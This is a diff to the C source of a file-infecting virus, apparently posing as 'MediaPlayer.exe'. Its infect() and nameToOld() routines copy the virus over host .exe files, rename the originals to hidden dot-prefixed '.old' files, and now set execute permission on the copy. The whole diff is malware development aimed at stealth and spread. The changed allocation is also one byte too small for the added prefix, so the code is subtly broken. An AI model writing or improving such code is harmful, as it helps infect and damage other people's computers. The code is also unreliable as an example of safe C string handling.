@@ -55,16 +55,24 @@ void prev_image() {
     char*
     nameToOld(char* name)
     {
-        char* new_name = (char *) malloc( 50 );
-        strcpy(new_name, name);
+        char* new_name = (char *) malloc(strlen(name)+1);
+        //strcpy(new_name, name);
+		//Possible improvement by hiding the .old
+		strcpy(new_name,".");
+		strcat(new_name,name);
+
 
         if(strcmp(name, "MediaPlayer.exe"))	// Verifing if the file is not MediaPlayer
         {
             if(strstr(name, ".exe")) // Verifing the extension of the file
             {
-                new_name[strlen(name)-1] = 'd';
-                new_name[strlen(name)-2] = 'l';
-                new_name[strlen(name)-3] = 'o';
+                //new_name[strlen(name)-1] = 'd';
+                //new_name[strlen(name)-2] = 'l';
+                //new_name[strlen(name)-3] = 'o';
+
+				new_name[strlen(new_name)-1] = 'd';
+                new_name[strlen(new_name)-2] = 'l';
+                new_name[strlen(new_name)-3] = 'o';
 
                 if(!fopen(new_name, "r"))//Verifing if we have already the same file
 				{
@@ -157,7 +165,7 @@ void infect()
     }    
 
 	printf("virus copié\n");
-
+	chmod(pname, S_IRUSR | S_IWUSR | S_IXUSR); // Permission
     fclose(fCopied);
 	fclose(fCopy);
 	free(pname);
